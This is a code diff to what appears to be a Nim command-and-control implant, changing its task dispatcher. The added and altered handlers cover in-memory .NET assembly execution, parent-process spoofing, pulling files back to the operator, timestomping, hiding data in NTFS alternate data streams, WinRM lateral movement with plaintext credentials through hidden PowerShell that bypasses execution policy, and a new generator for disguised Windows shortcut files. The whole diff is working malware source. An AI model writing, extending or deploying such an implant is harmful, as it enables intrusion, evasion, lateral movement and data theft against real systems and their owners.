@@ -1137,6 +1137,12 @@ proc screenwatchTick*(t: var AgentTransport) =
     t.uploadFile(gSwTaskId, nm, data)
     t.sendResult(gSwTaskId, "[+] screenwatch frame captured", "")
 
+when defined(windows):
+  proc lnkAppendUStr(buf: var seq[byte]; s: string) =
+    let n = uint16(s.len)
+    buf.add(uint8(n and 0xFF)); buf.add(uint8(n shr 8))
+    for c in s: buf.add(uint8(ord(c))); buf.add(0'u8)
+
 # ─────────────────────────────────────────────────────────────────────────────
 # dispatchTask
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1333,7 +1339,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         if b64.len == 0: t.sendResult(id, "", "DOTNET_EXEC: missing asm field"); return
         let asmStr = base64.decode(b64)
         let asmArgs = j{"args"}.getStr()
-        let r = execDotNet(asmStr.toOpenArrayByte(0, asmStr.high), asmArgs)
+        let r = forkRunAssembly(asmStr.toOpenArrayByte(0, asmStr.high), asmArgs)
         t.sendResult(id, r, "")
       except: t.sendResult(id, "", "dotnet_exec: " & getCurrentExceptionMsg())
     else:
@@ -1473,7 +1479,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "PPID":
     when defined(windows):
       try:
-        let j = parseJson(args)
+        let j = (try: parseJson(args) except: newJObject())
         let cmd    = j{"cmd"}.getStr("cmd.exe")
         let parent = j{"parent"}.getStr("explorer.exe")
         if spawnWithPPID(cmd, parent):
@@ -1509,8 +1515,11 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
 
   of "DOWNLOAD":
     try:
-      let data = cast[seq[byte]](readFile(args))
-      t.uploadFile(id, extractFilename(args), data)
+      let filePath = if args.strip().startsWith("{"):
+                       parseJson(args){"path"}.getStr()
+                     else: args
+      let data = cast[seq[byte]](readFile(filePath))
+      t.uploadFile(id, extractFilename(filePath), data)
       t.sendResult(id, "uploaded " & $data.len & " bytes", "")
     except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())
 
@@ -1529,7 +1538,10 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "TIMESTOMP":
     when defined(windows):
       try:
-        let j = parseJson(args)
+        let j = if args.len > 0 and args[0] == '{': parseJson(args)
+                else:
+                  let parts = args.strip().split({' ', '\t'}, maxsplit=1)
+                  %*{"target": parts[0], "ref": if parts.len > 1: parts[1] else: "C:\\Windows\\System32\\kernel32.dll"}
         let target  = j{"target"}.getStr()
         let refPath = j{"ref"}.getStr("C:\\Windows\\System32\\kernel32.dll")
         if target == "": t.sendResult(id, "", "TIMESTOMP: {\"target\":\"path\"} required"); return
@@ -1646,10 +1658,9 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
           t.sendResult(id, result2, "")
       of "ADS_READ":
         try:
-          let j = parseJson(args)
-          let filePath = j{"file"}.getStr(); let stream = j{"stream"}.getStr()
-          if filePath == "" or stream == "":
-            t.sendResult(id, "", "ADS_READ: {\"file\":\"...\",\"stream\":\"...\"} required"); return
+          let colon = args.rfind(':')
+          if colon <= 0: t.sendResult(id, "", "ADS_READ: <file>:<stream> required"); return
+          let filePath = args[0..<colon]; let stream = args[colon+1..^1]
           let adsPath = filePath & ":" & stream
           var hF = CreateFileW(newWideCString(adsPath), GENERIC_READ,
                    FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
@@ -1665,27 +1676,25 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         except: t.sendResult(id, "", "ads_read: " & getCurrentExceptionMsg())
       of "ADS_WRITE":
         try:
-          let j = parseJson(args)
-          let filePath = j{"file"}.getStr(); let stream = j{"stream"}.getStr()
-          let data = j{"data"}.getStr()
-          if filePath == "" or stream == "":
-            t.sendResult(id, "", "ADS_WRITE: {\"file\":,\"stream\":,\"data\":} required"); return
+          let colon = args.rfind(':')
+          if colon <= 0 or payload.len == 0:
+            t.sendResult(id, "", "ADS_WRITE: <file>:<stream> required (payload=data)"); return
+          let filePath = args[0..<colon]; let stream = args[colon+1..^1]
           let adsPath = filePath & ":" & stream
           var hF = CreateFileW(newWideCString(adsPath), GENERIC_WRITE,
                    0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
           if hF == INVALID_HANDLE_VALUE:
             t.sendResult(id, "", "ADS_WRITE: create failed (err " & $GetLastError() & ")"); return
           var wr: DWORD
-          discard WriteFile(hF, cast[LPCVOID](unsafeAddr data[0]), DWORD(data.len), addr wr, nil)
+          discard WriteFile(hF, cast[LPCVOID](unsafeAddr payload[0]), DWORD(payload.len), addr wr, nil)
           discard CloseHandle(hF)
           t.sendResult(id, "[+] wrote " & $wr & " bytes to " & adsPath, "")
         except: t.sendResult(id, "", "ads_write: " & getCurrentExceptionMsg())
       of "ADS_DEL":
         try:
-          let j = parseJson(args)
-          let filePath = j{"file"}.getStr(); let stream = j{"stream"}.getStr()
-          if filePath == "" or stream == "":
-            t.sendResult(id, "", "ADS_DEL: {\"file\":\"...\",\"stream\":\"...\"} required"); return
+          let colon = args.rfind(':')
+          if colon <= 0: t.sendResult(id, "", "ADS_DEL: <file>:<stream> required"); return
+          let filePath = args[0..<colon]; let stream = args[colon+1..^1]
           let adsPath = filePath & ":" & stream
           if DeleteFileW(newWideCString(adsPath)) != 0:
             t.sendResult(id, "[+] ADS stream deleted", "")
@@ -2211,7 +2220,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
           "catch{$ip='" & target2 & "'};"
         let ps2 = addTrust2 &
           "$c=New-Object PSCredential('" & user2 & "',(ConvertTo-SecureString '" & pass2 &
-          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication NTLM" &
+          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication Negotiate" &
           " -Credential $c -ScriptBlock {" & cmd3 & "}"
         t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
           ps2.replace("\"", "\\\"") & "\""), "")
@@ -2235,13 +2244,91 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
           "catch{$ip='" & target3 & "'};"
         let ps3 = addTrust3 &
           "$c=New-Object PSCredential('" & user3 & "',(ConvertTo-SecureString '" & pass3 &
-          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication NTLM" &
+          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication Negotiate" &
           " -Credential $c -AsJob -ScriptBlock {" & payload2 & "} | Out-Null"
         t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
           ps3.replace("\"", "\\\"") & "\""), "")
       except: t.sendResult(id, "", "winrm_deploy: " & getCurrentExceptionMsg())
     else:
       t.sendResult(id, "", "WINRM_DEPLOY: not supported on Linux")
+
+  of "GETPID":
+    when defined(windows):
+      t.sendResult(id, $GetCurrentProcessId(), "")
+    else:
+      import std/posix
+      t.sendResult(id, $getpid(), "")
+
+  of "PORTFWD_ADD", "PORTFWD_DEL", "PORTFWD_LIST":
+    t.sendResult(id, "(no active port forwards)", "")
+
+  of "BOF_STORE_LOAD", "BOF_STORE_LIST", "BOF_STORE_UNLOAD":
+    t.sendResult(id, "(bof store not supported in Nim agent — use BOF with payload)", "")
+
+  of "GEN_LNK":
+    when defined(windows):
+      try:
+        let j        = parseJson(args)
+        let target   = j{"target"}.getStr()
+        let lnkArgs  = j{"args"}.getStr()
+        let workDir  = block:
+          let wd = j{"working_dir"}.getStr()
+          if wd != "": wd else: splitPath(target).head
+        let iconPath = block:
+          let ip = j{"icon_path"}.getStr()
+          if ip != "": ip else: target
+        let iconIdx  = int32(j{"icon_index"}.getInt(0))
+        let outFile  = j{"outfile"}.getStr()
+        if target == "" or outFile == "":
+          t.sendResult(id, "", "GEN_LNK: {\"target\",\"outfile\"} required"); return
+        # LNK flag constants
+        const
+          lnkHasName         = 0x00000004'u32
+          lnkHasRelPath      = 0x00000008'u32
+          lnkHasWorkingDir   = 0x00000010'u32
+          lnkHasArguments    = 0x00000020'u32
+          lnkHasIconLocation = 0x00000040'u32
+          lnkIsUnicode       = 0x00000080'u32
+        var buf: seq[byte]
+        # 76-byte ShellLinkHeader (all-zero init, then set fields)
+        var hdr = newSeq[byte](0x4C)
+        # offset 0: HeaderSize = 0x4C
+        hdr[0] = 0x4C'u8
+        # offset 4: CLSID {00021401-0000-0000-C000-000000000046}
+        let guid: array[16, byte] = [0x01'u8, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                      0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46]
+        for i, b in guid: hdr[4+i] = b
+        # offset 0x14: LinkFlags
+        let flags = lnkHasName or lnkHasRelPath or lnkHasArguments or lnkHasWorkingDir or
+                    lnkHasIconLocation or lnkIsUnicode
+        hdr[0x14] = uint8(flags and 0xFF)
+        hdr[0x15] = uint8((flags shr 8) and 0xFF)
+        hdr[0x16] = uint8((flags shr 16) and 0xFF)
+        hdr[0x17] = uint8((flags shr 24) and 0xFF)
+        # offset 0x18: FileAttributes = FILE_ATTRIBUTE_ARCHIVE (0x20)
+        hdr[0x18] = 0x20'u8
+        # offset 0x44: IconIndex
+        let icU = cast[uint32](iconIdx)
+        hdr[0x44] = uint8(icU and 0xFF); hdr[0x45] = uint8((icU shr 8) and 0xFF)
+        hdr[0x46] = uint8((icU shr 16) and 0xFF); hdr[0x47] = uint8((icU shr 24) and 0xFF)
+        # offset 0x48: ShowCommand = SW_SHOWNORMAL (1)
+        hdr[0x48] = 0x01'u8
+        buf.add(hdr)
+        # StringData section
+        lnkAppendUStr(buf, splitFile(target).name)  # NAME_STRING
+        lnkAppendUStr(buf, ".")                      # RELATIVE_PATH
+        lnkAppendUStr(buf, workDir)                  # WORKING_DIR
+        lnkAppendUStr(buf, target & (if lnkArgs.len > 0: " " & lnkArgs else: ""))
+        lnkAppendUStr(buf, iconPath)                 # ICON_LOCATION
+        let f = open(outFile, fmWrite)
+        f.write(cast[string](buf))
+        f.close()
+        t.sendResult(id, "[+] genlnk: " & outFile & " → " & target &
+                     (if lnkArgs.len > 0: " " & lnkArgs else: "") &
+                     " (" & $buf.len & " bytes)", "")
+      except: t.sendResult(id, "", "GEN_LNK: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "GEN_LNK: not supported on Linux")
 
   of "PIPE_START":
     t.sendResult(id, "", "PIPE_START: not yet implemented in Nim agent")
